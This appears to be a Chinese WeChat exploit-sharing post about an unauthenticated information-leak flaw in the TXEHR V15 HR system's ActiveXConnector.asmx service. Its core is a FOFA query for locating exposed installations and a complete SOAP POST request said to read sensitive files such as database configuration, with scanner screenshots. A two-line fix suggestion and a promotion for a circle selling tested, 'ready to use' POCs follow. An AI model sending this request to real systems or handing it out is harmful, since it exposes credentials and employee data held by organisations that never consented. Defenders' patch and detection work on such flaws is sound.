#  同享人力资源管理系统-TXEHR V15 ActiveXConnector 信息泄露漏洞   
Superhero  nday POC   2024-12-23 02:55  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
同享人力资源管理系统  
（TXEHR V15）是一款专为现代企业设计的人力资源管理软件解决方案，旨在通过先进的信息化手段提升企业人力资源管理的效率与水平。该系统集成了组织人事、考勤管理、薪资核算、招聘配置、培训发展、绩效管理等核心模块，并提供了灵活的配置选项和强大的数据分析能力，以满足不同企业规模和行业特性的需求。  
**01******  
  
**漏洞概述**  
  
  
同享人力资源管理系统-TXEHR V15 ActiveXConnector.asmx 接口处存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件如数据库配置文件等，导致网站处于极度不安全状态。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="/Assistant/Default.aspx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLkGrBCJATOePw7syS0ianfDg5w8wXeniaxZddumKaibyMlYjFQDnS0tf4YeSu6oFiaHalDb0Qcx7Jocw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /Service/ActiveXConnector.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetActivexConnector/>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLkGrBCJATOePw7syS0ianfD3ou5wEQghVvVGnAh9eeIDMH9M6WBCDpuGr94OdujNaaB3kbbvvXibicw/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLkGrBCJATOePw7syS0ianfDicHbCHFNTQKbWJ8KGBsuj36PByeW8jPsovzhHNqnOwFicQas4twjdMpA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLkGrBCJATOePw7syS0ianfDgdiaPibzQiaYOAt7g7CkCnzbBq5xHokNQnK0Io6SicycWxq898gN54m3WA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLkGrBCJATOePw7syS0ianfDvjn7CpYleJ4wSx2KTH0WS7dIUOAwrCbuj0uPVL8icUIIFdMorpUyZog/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
打补丁或升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
